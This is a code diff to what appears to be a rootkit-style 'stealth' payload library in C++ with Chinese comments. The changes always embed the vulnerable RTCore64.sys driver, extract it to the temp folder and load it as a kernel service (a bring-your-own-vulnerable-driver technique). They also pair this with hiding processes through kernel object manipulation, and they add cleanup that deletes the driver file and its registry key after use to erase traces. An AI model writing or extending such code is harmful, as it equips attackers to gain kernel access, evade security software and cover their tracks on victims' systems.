@@ -46,12 +46,9 @@ static void ByovdDiag(const char* fmt, ...) {
 }
 
 // BYOVD 驱动嵌入支持: 将 RTCore64.sys 编译进 payload
-//   1. python scripts/embed_driver.py RTCore64.sys
-//   2. 复制生成的 rtcore64_embed.h 到 stealth_lib/
-//   3. 编译时加 -DBYOVD_EMBED_RTCORE64
-#ifdef BYOVD_EMBED_RTCORE64
+//   python scripts/embed_driver.py RTCore64.sys → rtcore64_embed.h
+//   v3.47: 始终嵌入, 移除 #ifdef 编译开关 — 驱动从 TEMP 提取
 #include "rtcore64_embed.h"
-#endif
 
 #pragma comment(lib, "advapi32.lib")
 
@@ -261,34 +258,32 @@ static std::wstring EnsureDriverFile(const std::wstring& driverName) {
     }
 
     // 2. 从嵌入字节提取到 %TEMP%
-#ifdef BYOVD_EMBED_RTCORE64
-    const uint8_t* embedData = nullptr;
-    size_t embedSize = 0;
+    {
+        const uint8_t* embedData = nullptr;
+        size_t embedSize = 0;
 
-    // 匹配驱动文件名
-    if (driverName == L"RTCore64.sys") {
-        embedData = stealth::embedded::RTCore64_data;
-        embedSize = stealth::embedded::RTCore64_size;
-    }
-    // 可扩展: gdrv.sys 等
+        // 匹配驱动文件名
+        if (driverName == L"RTCore64.sys") {
+            embedData = stealth::embedded::RTCore64_data;
+            embedSize = stealth::embedded::RTCore64_size;
+        }
 
-    if (embedData && embedSize > 0) {
-        wchar_t tempPath[MAX_PATH];
-        GetTempPathW(MAX_PATH, tempPath);
-        wcscat_s(tempPath, driverName.c_str());
+        if (embedData && embedSize > 0) {
+            wchar_t tempPath[MAX_PATH];
+            GetTempPathW(MAX_PATH, tempPath);
+            wcscat_s(tempPath, driverName.c_str());
 
-        // 写入嵌入字节到临时文件
-        std::ofstream out(tempPath, std::ios::binary);
-        if (out.is_open()) {
-            out.write(reinterpret_cast<const char*>(embedData), embedSize);
-            out.close();
+            std::ofstream out(tempPath, std::ios::binary);
+            if (out.is_open()) {
+                out.write(reinterpret_cast<const char*>(embedData), embedSize);
+                out.close();
 
-            if (GetFileAttributesW(tempPath) != INVALID_FILE_ATTRIBUTES) {
-                return std::wstring(tempPath);
+                if (GetFileAttributesW(tempPath) != INVALID_FILE_ATTRIBUTES) {
+                    return std::wstring(tempPath);
+                }
             }
         }
     }
-#endif
 
     // 3. 回退: 返回空 → 尝试以纯文件名加载 (LoadDriver 会补全 System32 路径)
     return L"";
@@ -333,8 +328,17 @@ bool KernelMemoryAccessor::LoadDriver(const std::wstring& serviceName,
             wcscpy_s(fullPath, driverPath.c_str());
         }
 
+        // v3.48: 内核需要 NT 路径格式 — 自动加 \??\ 前缀
+        wchar_t ntPath[MAX_PATH * 2];
+        if (fullPath[0] != L'\\' && fullPath[1] != L'\\') {
+            swprintf_s(ntPath, L"\\??\\%ls", fullPath);
+        } else {
+            wcscpy_s(ntPath, fullPath);
+        }
+
         RegSetValueExW(hKey, L"ImagePath", 0, REG_EXPAND_SZ,
-                       (BYTE*)fullPath, (DWORD)((wcslen(fullPath) + 1) * sizeof(wchar_t)));
+                       (BYTE*)ntPath, (DWORD)((wcslen(ntPath) + 1) * sizeof(wchar_t)));
+        ByovdDiag("BYOVD:LoadDriver: ImagePath=%ls\n", ntPath);
         RegCloseKey(hKey);
     }
 
@@ -1362,7 +1366,26 @@ KernelDefense::Result KernelDefense::EnableAll() {
 
 void KernelDefense::DisableAll() {
     DKOMProcessHider::Instance().UnhideProcess();
-    KernelMemoryAccessor::Instance().Shutdown();
+    auto& kma = KernelMemoryAccessor::Instance();
+
+    // v3.49: 一用即卸 — 卸载驱动 + 清除注册表 + 删除驱动文件
+    if (kma.IsActive()) {
+        std::wstring svcName = kma.GetServiceName();
+        std::wstring drvPath = kma.GetDriverPath();
+
+        kma.Shutdown();
+
+        // 删除注册表服务键
+        std::wstring keyPath = L"SYSTEM\\CurrentControlSet\\Services\\" + svcName;
+        RegDeleteTreeW(HKEY_LOCAL_MACHINE, keyPath.c_str());
+
+        // 删除 TEMP 中的驱动文件
+        if (!drvPath.empty()) {
+            DeleteFileW(drvPath.c_str());
+        }
+
+        ByovdDiag("BYOVD: %ls unloaded & cleaned.\n", svcName.c_str());
+    }
 }
 
 // ============================================================
